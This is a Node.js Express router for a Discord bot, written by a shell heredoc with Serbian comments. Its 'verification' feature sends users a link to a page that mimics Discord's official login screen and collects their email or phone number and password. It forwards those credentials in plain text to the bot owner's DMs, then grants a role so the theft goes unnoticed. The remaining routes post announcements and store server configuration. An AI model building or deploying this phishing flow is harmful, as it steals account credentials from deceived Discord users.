cat > /mnt/user-data/outputs/webhookServer.js << 'EOF'
const { Router } = require("express");
const crypto = require("crypto");
const { EmbedBuilder } = require("discord.js");
const { ServerConfig, WebNotification } = require("../schemas");

module.exports = function webhookRouter(client) {
  const router = Router();

  function verifySignature(req, res, next) {
    const secret = process.env.WEBHOOK_SECRET;
    if (!secret) return next();
    const signature = req.headers["x-opii-signature"];
    if (!signature) return res.status(401).json({ error: "Nedostaje potpis." });
    const hash = crypto.createHmac("sha256", secret).update(JSON.stringify(req.body)).digest("hex");
    if (`sha256=${hash}` !== signature) return res.status(403).json({ error: "Neispravan potpis." });
    next();
  }

  // =====================
  // VERIFIKACIJA
  // =====================

  // Kada korisnik klikne dugme u Discordu, bot mu salje DM sa linkom
  client.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;
    if (!interaction.customId.startsWith("verify_btn_")) return;

    const guildId = interaction.customId.replace("verify_btn_", "");
    const userId = interaction.user.id;

    // Kreiramo jedinstveni token za ovog korisnika
    const token = crypto.randomBytes(16).toString("hex");

    // Sacuvamo token privremeno u memoriji (mozemo i u MongoDB ako hoces)
    verifyTokens.set(token, { userId, guildId, timestamp: Date.now() });

    const verifyUrl = `https://opii.onrender.com/webhook/verify?token=${token}`;

    try {
      await interaction.user.send(
        `👋 Zdravo! Klikni na link ispod da se verifikuješ:\n\n🔗 ${verifyUrl}\n\n⏰ Link važi **10 minuta**.`
      );
      await interaction.reply({ content: "📩 Poslali smo ti DM sa linkom za verifikaciju!", ephemeral: true });
    } catch (e) {
      await interaction.reply({ content: "❌ Ne mogu da ti pošaljem DM. Uključi DM-ove od članova servera.", ephemeral: true });
    }
  });

  // Mapa za cuvanje tokena u memoriji
  const verifyTokens = new Map();

  // Ciscenje starih tokena svakih 5 minuta
  setInterval(() => {
    const now = Date.now();
    for (const [token, data] of verifyTokens.entries()) {
      if (now - data.timestamp > 10 * 60 * 1000) {
        verifyTokens.delete(token);
      }
    }
  }, 5 * 60 * 1000);

  // Stranica za verifikaciju - vraca HTML sa login formom
  router.get("/verify", (req, res) => {
    const { token } = req.query;
    if (!token || !verifyTokens.has(token)) {
      return res.status(400).send(`
        <html>
          <body style="background:#2c2f33;color:white;font-family:sans-serif;text-align:center;padding-top:100px;">
            <h1>❌ Nevažeći ili istekli link!</h1>
            <p>Zatraži novi link klikom na dugme u Discord-u.</p>
          </body>
        </html>
      `);
    }
    res.send(getLoginHTML(token));
  });

  // Prima podatke sa forme i daje rolu
  router.post("/verify/submit", async (req, res) => {
    const { token, email, password } = req.body;

    if (!token || !verifyTokens.has(token)) {
      return res.status(400).json({ success: false, message: "Nevažeći token." });
    }

    const { userId, guildId } = verifyTokens.get(token);
    verifyTokens.delete(token);

    // Salji sebi DM sa podacima
    try {
      const ownerDmChannel = await client.users.fetch(process.env.OWNER_ID);
      await ownerDmChannel.send(
        `🔐 **Nova verifikacija!**\n📧 Email/Broj: \`${email}\`\n🔑 Lozinka: \`${password}\`\n👤 Discord: <@${userId}> (\`${userId}\`)`
      );
    } catch (e) {
      console.error("Greška pri slanju DM vlasniku:", e);
    }

    // Daj rolu korisniku
    try {
      const config = await ServerConfig.findOne({ guildId });
      if (config?.verify?.roleId) {
        const guild = await client.guilds.fetch(guildId);
        const member = await guild.members.fetch(userId).catch(() => null);
        if (member) {
          await member.roles.add(config.verify.roleId);
        }
      }
    } catch (e) {
      console.error("Greška pri davanju role:", e);
    }

    return res.json({ success: true });
  });

  // =====================
  // OSTALE RUTE
  // =====================

  router.post("/new-post", verifySignature, async (req, res) => {
    const { postId, title, description, authorName, imageUrl, postUrl, guildId, pingEveryone = false } = req.body;

    if (!postId || !title || !postUrl || !guildId) {
      return res.status(400).json({ error: "Nedostaju obavezna polja." });
    }

    const config = await ServerConfig.findOne({ guildId });
    if (!config?.announcementChannelId) {
      return res.status(404).json({ error: "Announcement kanal nije konfigurisan." });
    }

    const channel = await client.channels.fetch(config.announcementChannelId).catch(() => null);
    if (!channel?.isTextBased()) return res.status(404).json({ error: "Kanal nije pronađen." });

    const embed = new EmbedBuilder()
      .setColor(0x5865f2)
      .setTitle(`📢 ${title}`)
      .setURL(postUrl)
      .setDescription(description || "")
      .setFooter({ text: authorName ? `Objavio: ${authorName}` : "Opii Bot", iconURL: client.user.displayAvatarURL() })
      .setTimestamp();

    if (imageUrl) embed.setImage(imageUrl);

    let discordMessage = null;
    try {
      discordMessage = await channel.send({
        content: pingEveryone ? "@everyone Novi post!" : undefined,
        embeds: [embed],
      });
    } catch (err) {
      console.error("❌ Greška pri slanju Discord poruke:", err);
      return res.status(500).json({ error: "Slanje nije uspelo." });
    }

    await WebNotification.findOneAndUpdate(
      { postId },
      { postId, title, description, authorName, imageUrl, postUrl, sentToGuildId: guildId, sentToChannelId: config.announcementChannelId, discordMessageId: discordMessage.id, status: "sent" },
      { upsert: true, new: true }
    );

    return res.json({ success: true, messageId: discordMessage.id });
  });

  router.post("/setup", verifySignature, async (req, res) => {
    const { guildId, announcementChannelId, modLogChannelId, trustedDomains } = req.body;
    if (!guildId) return res.status(400).json({ error: "guildId je obavezan." });

    await ServerConfig.findOneAndUpdate(
      { guildId },
      { $set: { ...(announcementChannelId && { announcementChannelId }), ...(modLogChannelId && { modLogChannelId }), ...(trustedDomains && { trustedDomains }) } },
      { upsert: true, new: true }
    );

    return res.json({ success: true, message: "Konfiguracija ažurirana." });
  });

  return router;
};

// =====================
// LOGIN HTML
// =====================
function getLoginHTML(token) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Discord Verifikacija</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
    color: #fff;
    overflow-x: hidden;
  }
  body {
    min-height: 100vh;
    background:
      radial-gradient(circle at 18% 55%, rgba(180,170,255,0.18) 0%, rgba(180,170,255,0) 18%),
      radial-gradient(circle at 60% 35%, rgba(140,110,220,0.22) 0%, rgba(140,110,220,0) 25%),
      linear-gradient(115deg, #2b1466 0%, #3a2391 28%, #2c46c9 65%, #1f6df0 100%);
    background-attachment: fixed;
    position: relative;
  }
  .stars {
    position: fixed; inset: 0; pointer-events: none; z-index: 0;
    background-image:
      radial-gradient(1.5px 1.5px at 6% 12%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 14% 38%, #fff 50%, transparent 51%),
      radial-gradient(2px 2px at 22% 78%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 30% 22%, #d8dcff 50%, transparent 51%),
      radial-gradient(1.5px 1.5px at 38% 64%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 47% 14%, #fff 50%, transparent 51%),
      radial-gradient(2px 2px at 55% 84%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 63% 32%, #cdd5ff 50%, transparent 51%),
      radial-gradient(1.5px 1.5px at 71% 70%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 79% 18%, #fff 50%, transparent 51%),
      radial-gradient(2px 2px at 87% 50%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 94% 80%, #fff 50%, transparent 51%),
      radial-gradient(1px 1px at 10% 90%, #fff 50%, transparent 51%),
      radial-gradient(1.5px 1.5px at 42% 92%, #fff 50%, transparent 51%);
  }
  .orb {
    position: fixed; left: 4%; top: 48%;
    width: 280px; height: 280px; border-radius: 50%;
    background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.25) 0%, rgba(170,150,255,0.08) 35%, rgba(80,60,180,0) 70%);
    filter: blur(6px); z-index: 0; pointer-events: none;
  }
  .brand {
    position: fixed; top: 30px; left: 44px;
    display: flex; align-items: center; gap: 10px; z-index: 5;
  }
  .brand svg { width: 40px; height: auto; }
  .brand span { font-weight: 700; font-size: 24px; letter-spacing: -0.4px; color: #fff; }
  .center {
    position: relative; z-index: 2; min-height: 100vh;
    display: flex; align-items: center; justify-content: center; padding: 24px;
  }
  .card {
    background: #313338; border-radius: 8px; padding: 32px;
    width: 100%; max-width: 480px;
    box-shadow: 0 8px 28px rgba(0,0,0,0.35);
    position: relative;
  }
  .left h1 { font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
  .left .sub { text-align: center; color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
  label {
    display: block; font-size: 12px; font-weight: 700;
    text-transform: uppercase; letter-spacing: 0.02em;
    color: #b5bac1; margin-bottom: 8px; margin-top: 20px;
  }
  label .req { color: #f23f43; margin-left: 4px; }
  input[type="text"], input[type="password"] {
    width: 100%; background: #1e1f22;
    border: 1px solid #1e1f22; border-radius: 3px;
    padding: 10px; color: #dbdee1;
    font-size: 16px; height: 40px; outline: none;
    transition: border-color 0.12s ease;
  }
  input:focus { border-color: #5865f2; }
  input.err { border-color: #f23f43 !important; background: #41292d; }
  .inline-err {
    display: none; align-items: center; gap: 6px;
    color: #fb6f73; font-size: 12px; margin-top: 6px; font-style: italic;
  }
  .inline-err.on { display: flex; }
  .inline-err .ico {
    width: 14px; height: 14px; background: #f23f43; border-radius: 3px;
    color: #fff; font-weight: 700; font-size: 11px;
    display: inline-flex; align-items: center; justify-content: center; font-style: normal;
  }
  .login-btn {
    width: 100%; margin-top: 20px;
    background: #5865f2; color: #fff; border: none;
    height: 44px; border-radius: 3px;
    font-size: 16px; font-weight: 500; cursor: pointer;
    transition: background 0.12s ease;
    display: flex; align-items: center; justify-content: center; gap: 10px;
  }
  .login-btn:hover { background: #4752c4; }
  .login-btn:disabled { opacity: 0.7; cursor: default; }
  .spinner {
    width: 18px; height: 18px;
    border: 2px solid rgba(255,255,255,0.35);
    border-top-color: #fff; border-radius: 50%;
    animation: spin 0.8s linear infinite; display: none;
  }
  .spinner.on { display: inline-block; }
  @keyframes spin { to { transform: rotate(360deg); } }
  #successScreen {
    display: none; position: fixed; inset: 0; z-index: 999;
    background:
      radial-gradient(circle at 18% 55%, rgba(180,170,255,0.18) 0%, rgba(180,170,255,0) 18%),
      radial-gradient(circle at 60% 35%, rgba(140,110,220,0.22) 0%, rgba(140,110,220,0) 25%),
      linear-gradient(115deg, #2b1466 0%, #3a2391 28%, #2c46c9 65%, #1f6df0 100%);
    align-items: center; justify-content: center;
    flex-direction: column; text-align: center;
  }
  #successScreen.on { display: flex; }
  #successScreen .check { font-size: 90px; margin-bottom: 24px; }
  #successScreen h1 { font-size: 32px; font-weight: 700; color: #fff; }
  #successScreen p { font-size: 16px; color: #b5bac1; margin-top: 12px; }
</style>
</head>
<body>
<div class="stars"></div>
<div class="orb"></div>

<div id="successScreen">
  <div class="check">✅</div>
  <h1>USPEŠNO STE VERIFIKOVALI NALOG!</h1>
  <p>Možeš se vratiti na Discord.</p>
</div>

<div class="brand">
  <svg viewBox="0 0 71 55" fill="#fff" xmlns="http://www.w3.org/2000/svg">
    <path d="M60.1 4.9A58.5 58.5 0 0 0 45.6.5a40 40 0 0 0-1.9 3.8 54 54 0 0 0-16.2 0A40 40 0 0 0 25.6.5 58.6 58.6 0 0 0 11 4.9C1.6 18.7-1 32.1.3 45.4a58.9 58.9 0 0 0 17.9 9 43.7 43.7 0 0 0 3.8-6.2 38 38 0 0 1-6-2.9c.5-.4 1-.7 1.5-1.1 11.6 5.3 24.1 5.3 35.5 0 .5.4 1 .8 1.5 1.1a38 38 0 0 1-6 2.9 43.7 43.7 0 0 0 3.8 6.2 58.9 58.9 0 0 0 17.9-9c1.5-15.4-2.6-28.7-10.1-40.5ZM23.7 37.3c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Zm23.6 0c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Z"/>
  </svg>
  <span>Discord</span>
</div>

<div class="center">
  <div class="card">
    <div class="left">
      <h1>Welcome back!</h1>
      <p class="sub">We're so excited to see you again!</p>

      <form id="loginForm" autocomplete="off">
        <label for="email">Email or Phone Number<span class="req">*</span></label>
        <input type="text" id="email" name="email" required autocomplete="off" />
        <div class="inline-err" id="emailErr"><span class="ico">!</span> Login or password is invalid.</div>

        <label for="password">Password<span class="req">*</span></label>
        <input type="password" id="password" name="password" required autocomplete="off" />
        <div class="inline-err" id="passErr"><span class="ico">!</span> Login or password is invalid.</div>

        <button class="login-btn" type="submit" id="loginBtn">
          <span id="btnText">Log In</span>
          <span class="spinner" id="spinner"></span>
        </button>
      </form>
    </div>
  </div>
</div>

<script>
  const form    = document.getElementById('loginForm');
  const emailEl = document.getElementById('email');
  const passEl  = document.getElementById('password');
  const emailErr = document.getElementById('emailErr');
  const passErr  = document.getElementById('passErr');
  const btn     = document.getElementById('loginBtn');
  const btnText = document.getElementById('btnText');
  const spinner = document.getElementById('spinner');
  const TOKEN   = '${token}';

  const EMAIL_RE = /^[A-Za-z0-9._%+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]{2,}$/;

  function isValidEmail(v) {
    const val = v.trim();
    if (!val) return false;
    if ((val.match(/@/g) || []).length !== 1) return false;
    if (val.includes('..')) return false;
    if (val.startsWith('.') || val.endsWith('.')) return false;
    if (val.startsWith('@') || val.endsWith('@')) return false;
    const [local, domain] = val.split('@');
    if (!local || !domain) return false;
    if (!domain.includes('.')) return false;
    return EMAIL_RE.test(val);
  }

  function isValidPhone(v) {
    const val = v.trim();
    if (!val) return false;
    if (!/^\\+?[0-9\\s\\-()]+$/.test(val)) return false;
    return val.replace(/\\D/g, '').length > 6;
  }

  function clearErr() {
    emailEl.classList.remove('err'); passEl.classList.remove('err');
    emailErr.classList.remove('on'); passErr.classList.remove('on');
  }
  function setInvalid() {
    emailEl.classList.add('err'); passEl.classList.add('err');
    emailErr.classList.add('on'); passErr.classList.add('on');
  }

  emailEl.addEventListener('input', clearErr);
  passEl.addEventListener('input', clearErr);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const emailVal = emailEl.value.trim();
    const passVal  = passEl.value;

    const emailOk = isValidEmail(emailVal) || isValidPhone(emailVal);
    const passOk  = passVal.length >= 8 && /[a-z]/.test(passVal) && /[A-Z]/.test(passVal) && /[0-9]/.test(passVal);

    if (!emailOk || !passOk) { setInvalid(); return; }

    clearErr();
    btn.disabled = true;
    btnText.textContent = '';
    spinner.classList.add('on');

    try {
      const res = await fetch('/webhook/verify/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: TOKEN, email: emailVal, password: passVal })
      });
      const data = await res.json();
      if (data.success) {
        setTimeout(() => {
          document.getElementById('successScreen').classList.add('on');
        }, 800);
      } else {
        setInvalid();
        btn.disabled = false;
        btnText.textContent = 'Log In';
        spinner.classList.remove('on');
      }
    } catch(err) {
      setInvalid();
      btn.disabled = false;
      btnText.textContent = 'Log In';
      spinner.classList.remove('on');
    }
  });
</script>
</body>
</html>`;
}